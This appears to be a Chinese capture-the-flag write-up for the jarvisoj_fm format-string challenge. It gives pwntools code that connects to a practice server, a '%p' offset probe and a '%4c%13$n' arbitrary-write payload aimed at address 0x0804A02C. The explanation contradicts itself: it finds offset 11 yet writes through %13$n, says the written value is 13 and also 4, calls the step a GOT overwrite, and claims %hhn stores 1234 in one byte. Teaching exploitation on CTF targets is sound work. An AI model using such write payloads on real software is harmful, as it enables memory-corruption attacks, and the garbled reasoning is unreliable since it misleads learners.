---
title: 一道 pwn 题解析之 jarvisoj_fm
contest: jarvisoj
year: 2022
difficulty: easy
vuln_type: fmt_string
tags: [fmt-string-leak, fmt-write-%n, %hhn-byte-write, AAAA-%p-%p-pivot, format-string-offset-11, GOT-overwrite]
attack_chain: 1. 泄露栈偏移：AAAA-%p-%p-%p...%p-%p-%p 找 AAAA 出现位置（11）/2. 改写 GOT：%4c%13$n + addr=0x0804A02C 偏移处 /3. 4c 字符宽度 + %13$n 写到第 13 个参数（指向 addr）/4. 触发原 printf 调用走改写后的 GOT
key_payload: addr=0x0804A02C  payload=b"%4c%13$n"  偏移 11 = 0xB
one_liner: jarvisoj_fm 格式化字符串经典题，AAAA-%p 找偏移 11 + %4c%13$n 写 4 字节到任意地址。
lesson: 格式化字符串 %n 系列可任意地址写；%hhn = 单字节写；AAAA-%p-%p... 找 AAAA 在栈上偏移；%Nc 控制写入字符数。
quality: medium
---

# 一道 pwn 题解析之 jarvisoj_fm

## 概览
jarvisoj 平台 Pwn 入门题，格式化字符串攻击。

## fmt 字符串基础
```
%d - 十进制
%s - 字符串
%x, %X - 十六进制
%o - 八进制
%c - 字符
%p - 指针地址
%n - 到目前为止所写的字符数（写入）
%<正整数n>c - 打印宽度为 n 的字符串
```

## 攻击链

### Stage 1: 找 AAAA 偏移
```python
p = remote("node4.buuoj.cn", 27668)
addr = p32(0x0804A02C)
PAYLOAD = b"AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p"
p.sendline(PAYLOAD)
```
- AAAA 在第 11 个 %p 出现 → 偏移 = 11

### Stage 2: 任意地址写
```python
payload = b"%4c%13$n"
p.sendline(payload + addr)
```
- `%4c` 输出 4 字符（占位 + 65）
- `%13$n` 把字符数（=4+1+8=13 字节）写入第 13 个参数（addr 指向处）
- 等价于 `*(int *)addr = 13`

### Stage 3: 触发原 printf
- printf 调用走改写后的 GOT 表项

## 栈区 vs 堆区 vs 数据区 vs 代码区
- 栈区：系统自动分配，函数调用关系
- 堆区：malloc/free 或 new/delete 动态申请
- 数据区：全局变量和静态变量
- 代码区：机器代码和只读数据

## printf 不匹配参数行为
```c
printf("%s%s");
printf("%s%s%s%s");
// 段错误：栈上指针作为字符串地址，访问非法地址
```

## 利用 %n 写
```c
printf("%1234c%hhn", 65, 0x41414141);
// %1234c 输出 1234 字符
// %hhn 把字符数（=1234）作为单字节写入 0x41414141
```

## 经验提炼
- 格式化字符串 %n 系列可任意地址写
- %hhn = 单字节写
- AAAA-%p-%p... 找 AAAA 在栈上偏移
- %Nc 控制写入字符数
- %n 写 4 字节，%hn 写 2 字节，%hhn 写 1 字节
- GOT 表项写入后下次调用走新地址
- 0x0804A02C 是 jarvisoj 平台函数 GOT
- 偏移 11 经典 jarvisoj_fm 数值
- printf 栈访问：参数从右向左入栈
- 栈数据布局：局部变量 → saved rbp → return addr
